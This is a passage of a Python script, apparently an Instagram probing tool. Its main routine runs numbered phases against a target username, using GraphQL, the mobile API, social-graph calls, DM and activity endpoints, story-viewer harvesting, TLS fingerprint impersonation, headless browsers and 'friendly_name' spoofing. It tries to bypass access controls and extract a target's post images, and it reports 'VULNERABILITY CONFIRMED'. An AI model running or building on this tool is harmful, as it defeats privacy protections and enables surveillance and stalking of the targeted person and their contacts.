            gql_probes_auth, gql_hit_auth = run_graphql_probes(
                username, user_id, cookies, stop_on_first, save, proxies)
            if not hit and gql_hit_auth:
                hit = gql_hit_auth

    alt_probes = []
                                                                          
                                                                              
                                                                  
    if full and not skip_graphql and (not hit or not stop_on_first):
        print()
        print("[*] Phase 7: ALTERNATIVE SURFACES (mobile host, oEmbed, Wayback, Bing)")
        alt_probes, alt_hit = run_alt_probes(username, cookies, save, proxies)
        if not hit and alt_hit:
            hit = alt_hit

    social_probes_unauth = []
    social_probes_auth = []

                                                                                     
    target_pk = None
    for p in probes_unauth + probes_auth:
        if p.get('kind') == 'html':
            uids = extract_user_ids(p['response'].text)
            if uids.get('pk'):
                target_pk = uids['pk']
                break
    if not target_pk and user_id:
        target_pk = user_id
    if not target_pk:
                                                          
        print()
        print(f"[*] Discovering pk for @{username} via web_profile_info...")
        target_pk, _ = discover_pk(username, cookies, proxies)
        if target_pk:
            print(f"    pk = {target_pk}")
        else:
            print(f"    [-] failed to discover pk; subsequent phases will skip")

                                                                         
                                                                
    if full and target_pk and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 8: SOCIAL-GRAPH probes (followers/following, pk={target_pk})")
        social_probes_unauth, social_hit = run_social_graph_probes(
            username, target_pk, None, save, proxies, stop_on_first)
        if not hit and social_hit:
            hit = social_hit
        if cookies and (not hit or not stop_on_first):
            print()
            print(f"[*] Phase 9: SOCIAL-GRAPH (auth, pk={target_pk})")
            social_probes_auth, social_hit_auth = run_social_graph_probes(
                username, target_pk, cookies, save, proxies, stop_on_first)
            if not hit and social_hit_auth:
                hit = social_hit_auth

                                                                            
                                                                             
                                                                        
                                                                        
                                                                           
                                                                         
    pigeon_probes = []
    if cookies and target_pk:
        print()
        print(f"[*] Phase 14: MOBILE PIGEON "
              f"(/users/{{pk}}/info/{ ' + 7 extras' if full else ' — lean'})")
        pigeon_probes, pigeon_hit = probe_mobile_pigeon(
            username, target_pk, cookies, save, proxies, full=full)
        if not hit and pigeon_hit:
            hit = pigeon_hit

    module_sweep_probes = []
    if cookies and target_pk:
        print()
        print(f"[*] Phase 17: MODULE-HINT SWEEP "
              f"({len(MODULE_HINT_SWEEP)} algorithm-path slices)")
        module_sweep_probes, _ = run_module_hint_sweep(
            username, target_pk, cookies, save, proxies)

                                                                   
                                                                        
                                                                    
    if reverse and cookies and target_pk:
        print()
        n_modules = len(MODULE_HINT_SWEEP if full else HIGH_VALUE_MODULES)
        print(f"[*] Phase 18: REVERSE CHAINING "
              f"(target geri-referansı + 2. derece graf, "
              f"{n_modules} modül/komşu)")
        run_reverse_chaining_sweep(username, target_pk, cookies, save,
                                     proxies, full=full)

                                                                             
                                                                          
    if dm and cookies and target_pk:
        print()
        print(f"[*] Phase 19: DM PRECHECK "
              f"({len(DM_PRECHECK_ENDPOINTS)} direct_v2 endpoint)")
        run_dm_precheck(username, target_pk, cookies, save, proxies)

                                                                       
                                                                           
                                                                      
                                                  
    if activity and cookies and target_pk:
        print()
        print(f"[*] Phase 20: ACTIVITY FORENSICS "
              f"({len(ACTIVITY_FORENSICS_ENDPOINTS)} endpoint + "
              f"opsiyonel story-viewer harvest)")
        run_activity_forensics(username, target_pk, cookies, save, proxies)

                                                                 
    if signal and cookies and target_pk:
        print()
        print(f"[*] Phase 21: HIGH-SIGNAL ENDPOINTS "
              f"({len(HIGH_SIGNAL_ENDPOINTS)} izole endpoint)")
        run_high_signal_endpoints(username, target_pk, cookies, save, proxies)

                                                                              
    if deep and cookies and target_pk:
        print()
        print(f"[*] Phase 22: DEEP PIGEON BYPASS "
              f"({len(DEEP_PIGEON_ENDPOINTS)} endpoint, i.instagram.com)")
        run_deep_pigeon_probes(username, target_pk, cookies, save, proxies)

                                                                         
    if bloks and cookies and target_pk:
        print()
        print(f"[*] Phase 23: BLOKS FRAMEWORK PROBE "
              f"({len(BLOKS_PROBE_APPS)} mobile UI render endpoint)")
        run_bloks_probes(username, target_pk, cookies, save, proxies)

                                                   
    if gql and cookies and target_pk:
        print()
        print(f"[*] Phase 24: GRAPHQL FRESH + FRIENDLY-NAME BYPASS "
              f"({len(KNOWN_POLARIS_QUERIES)} query × "
              f"{len(FRIENDLY_NAME_SPOOFS)+1} friendly_name × N shapes)")
        run_graphql_fresh(username, target_pk, cookies, save, proxies)

    tls_probes = []
                                                                        
                                                     
    if full and HAVE_CURL_CFFI and target_pk and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 15: TLS FINGERPRINT IMPERSONATION (curl_cffi)")
        tls_probes, tls_hit = probe_tls_impersonation(
            username, target_pk, cookies, save, proxies)
        if not hit and tls_hit:
            hit = tls_hit

    browser_probes = []
                                                                        
                                                     
    if full and HAVE_PLAYWRIGHT and not skip_graphql and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 16: REAL BROWSER (Playwright headless Chrome)")
        browser_probes, b_hit = probe_real_browser(
            username, cookies, save, proxies)
        if not hit and b_hit:
            hit = b_hit

    trigger_probes_unauth = []
    trigger_probes_auth = []
                                                                     
                                                                       
                                                                
    if full and not skip_graphql and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 12: TRIGGER-STATE probe "
              f"({len(TRIGGER_PROBE_COMBOS)} header combos)")
        trigger_probes_unauth, t_hit = run_trigger_state_probes(
            username, None, save, proxies, stop_on_first)
        if not hit and t_hit:
            hit = t_hit
        if cookies and (not hit or not stop_on_first):
            print()
            print(f"[*] Phase 13: TRIGGER-STATE (auth)")
            trigger_probes_auth, t_hit_auth = run_trigger_state_probes(
                username, cookies, save, proxies, stop_on_first)
            if not hit and t_hit_auth:
                hit = t_hit_auth

    nav_probes_unauth = []
    nav_probes_auth = []
                                                                        
                                                                             
    if full and not skip_graphql and (not hit or not stop_on_first):
        print()
        print(f"[*] Phase 10: NAV-CHAIN sweep ({len(NAV_CHAINS)} variants)")
        nav_probes_unauth, nav_hit = run_navchain_sweep(
            username, None, save, proxies, stop_on_first)
        if not hit and nav_hit:
            hit = nav_hit
        if cookies and (not hit or not stop_on_first):
            print()
            print(f"[*] Phase 11: NAV-CHAIN sweep (auth)")
            nav_probes_auth, nav_hit_auth = run_navchain_sweep(
                username, cookies, save, proxies, stop_on_first)
            if not hit and nav_hit_auth:
                hit = nav_hit_auth

    all_probes = (probes_unauth + probes_auth + uid_probes_unauth + uid_probes_auth
                  + gql_probes_unauth + gql_probes_auth + alt_probes
                  + social_probes_unauth + social_probes_auth
                  + pigeon_probes + module_sweep_probes
                  + tls_probes + browser_probes
                  + trigger_probes_unauth + trigger_probes_auth
                  + nav_probes_unauth + nav_probes_auth)

                                                                         
                                                                           
                                                                          
                                 
    if full:
        print()
        print("=" * 80)
        print(f"COHORT PROFILE  ({username})")
        print("=" * 80)
        print_cohort_report(all_probes)

        print()
        print("=" * 80)
        print(f"ANOMALY REPORT  ({username})")
        print("=" * 80)
        print_anomaly_report(all_probes, username, save)
        print_summary(all_probes, username)

                       
    if not full:
        print()
        print("=" * 80)
        print(f"LEAN RUN SUMMARY  ({username})")
        print("=" * 80)
        pigeon_count = sum(1 for p in pigeon_probes
                            if p.get('sig', {}).get('status') == 200
                            and p.get('sig', {}).get('bytes', 0) > 5000)
        chaining_count = 0
        for p in pigeon_probes + module_sweep_probes:
            chaining_count += len(p.get('chaining_results') or [])
        intel_path = os.path.join(ARTIFACT_ROOT, username, 'critical_intel.json')
        chain_path = os.path.join(ARTIFACT_ROOT, username, 'expanded_chaining_all_modules.json')
        sweep_count = len(module_sweep_probes)
        print(f"  pigeon /info/ rich responses: {pigeon_count}")
        print(f"  module-hint sweep calls:      {sweep_count}")
        print(f"  total chaining entries:       {chaining_count} (raw)")
        if os.path.exists(intel_path):
            print(f"  -> critical_intel.json saved (fbid_v2, dm_layer.date_joined, etc.)")
        if os.path.exists(chain_path):
            import json as _j
            try:
                with open(chain_path, encoding='utf-8') as f:
                    arr = _j.load(f)
                priv = sum(1 for a in arr if a.get('is_private'))
                print(f"  -> expanded_chaining_all_modules.json: "
                      f"{len(arr)} unique ({priv} private)")
            except Exception:
                pass
        if save:
            print(f"  artifacts dir: {os.path.join(ARTIFACT_ROOT, username)}")
        return                                                                              

    if not hit:
        print("[-] No probe produced timeline data (--full mode).")
        return

    print(f"[+] Hit on probe: {hit['label']}  ->  {hit['url']}")
    image_urls = harvest_urls_from_probe(hit)
    if not image_urls:
        for p in all_probes:
            image_urls = harvest_urls_from_probe(p)
            if image_urls:
                hit = p
                break

    if not image_urls:
        print("[-] Markers were present but no extractable URLs (probably profile pic family).")
        return

    urls_list = sorted(image_urls, key=lambda x: (x[0], x[1]))
    posts_count = len(set(u[0] for u in urls_list))

    print()
    print("=" * 80)
    print("VULNERABILITY CONFIRMED")
    print(f"Extracted {len(urls_list)} image URLs from {posts_count} posts via {hit['label']}")
    print("=" * 80)
    for i, (post_id, resolution, url) in enumerate(urls_list[:5], 1):
        print(f"  {i}. post={post_id} res={resolution}")
        print(f"     {url[:110]}...")

    save_urls_to_file(image_urls)
    print()
    print("[*] Evidence saved to: extracted_urls.txt")
    if save:
        print(f"[*] Per-variant artifacts under: {os.path.join(ARTIFACT_ROOT, username)}")


if __name__ == "__main__":
    main()
